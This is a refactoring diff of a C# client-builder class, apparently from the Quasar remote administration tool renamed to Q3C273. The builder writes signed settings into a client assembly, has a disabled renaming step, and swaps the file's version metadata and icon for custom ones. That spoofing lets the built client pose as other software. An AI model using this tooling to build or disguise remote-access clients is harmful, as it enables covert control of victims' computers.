@@ -1,14 +1,14 @@
 ﻿using Mono.Cecil;
 using Mono.Cecil.Cil;
-using Quasar.Common.Cryptography;
-using Quasar.Server.Models;
+using Q3C273.Server.Models;
+using Q3C273.Shared.Cryptography;
 using System;
 using System.Security.Cryptography;
 using System.Security.Cryptography.X509Certificates;
 using System.Text;
 using Vestris.ResourceLib;
 
-namespace Quasar.Server.Build
+namespace Q3C273.Server.Build
 {
     /// <summary>
     /// Provides methods used to create a custom client executable.
@@ -29,13 +29,13 @@ namespace Quasar.Server.Build
         /// </summary>
         public void Build()
         {
-            using (AssemblyDefinition asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
+            using (var asmDef = AssemblyDefinition.ReadAssembly(_clientFilePath))
             {
                 // PHASE 1 - Writing settings
                 WriteSettings(asmDef);
 
                 // PHASE 2 - Renaming
-                Renamer r = new Renamer(asmDef);
+                var r = new Renamer(asmDef);
 
                 //if (!r.Perform())
                 //    throw new Exception("renaming failed");
@@ -47,14 +47,14 @@ namespace Quasar.Server.Build
             // PHASE 4 - Assembly Information changing
             if (_options.AssemblyInformation != null)
             {
-                VersionResource versionResource = new VersionResource();
+                var versionResource = new VersionResource();
                 versionResource.LoadFrom(_options.OutputPath);
 
                 versionResource.FileVersion = _options.AssemblyInformation[7];
                 versionResource.ProductVersion = _options.AssemblyInformation[6];
                 versionResource.Language = 0;
 
-                StringFileInfo stringFileInfo = (StringFileInfo) versionResource["StringFileInfo"];
+                var stringFileInfo = (StringFileInfo)versionResource["StringFileInfo"];
                 stringFileInfo["CompanyName"] = _options.AssemblyInformation[2];
                 stringFileInfo["FileDescription"] = _options.AssemblyInformation[1];
                 stringFileInfo["ProductName"] = _options.AssemblyInformation[0];
@@ -72,8 +72,8 @@ namespace Quasar.Server.Build
             // PHASE 5 - Icon changing
             if (!string.IsNullOrEmpty(_options.IconPath))
             {
-                IconFile iconFile = new IconFile(_options.IconPath);
-                IconDirectoryResource iconDirectoryResource = new IconDirectoryResource(iconFile);
+                var iconFile = new IconFile(_options.IconPath);
+                var iconDirectoryResource = new IconDirectoryResource(iconFile);
                 iconDirectoryResource.SaveTo(_options.OutputPath);
             }
         }
@@ -88,7 +88,7 @@ namespace Quasar.Server.Build
 
             byte[] signature;
             // https://stackoverflow.com/a/49777672 RSACryptoServiceProvider must be changed with .NET 4.6
-            using (var csp = (RSACryptoServiceProvider) caCertificate.PrivateKey)
+            using (var csp = (RSACryptoServiceProvider)caCertificate.PrivateKey)
             {
                 var hash = Sha256.ComputeHash(Encoding.UTF8.GetBytes(key));
                 signature = csp.SignHash(hash, CryptoConfig.MapNameToOID("SHA256"));
@@ -104,7 +104,7 @@ namespace Quasar.Server.Build
                         {
                             int strings = 1, bools = 1;
 
-                            for (int i = 0; i < methodDef.Body.Instructions.Count; i++)
+                            for (var i = 0; i < methodDef.Body.Instructions.Count; i++)
                             {
                                 if (methodDef.Body.Instructions[i].OpCode == OpCodes.Ldstr) // string
                                 {
@@ -198,7 +198,7 @@ namespace Quasar.Server.Build
         /// <returns>Returns the OpCode that represents the value provided.</returns>
         private OpCode BoolOpCode(bool p)
         {
-            return (p) ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
+            return p ? OpCodes.Ldc_I4_1 : OpCodes.Ldc_I4_0;
         }
 
         /// <summary>
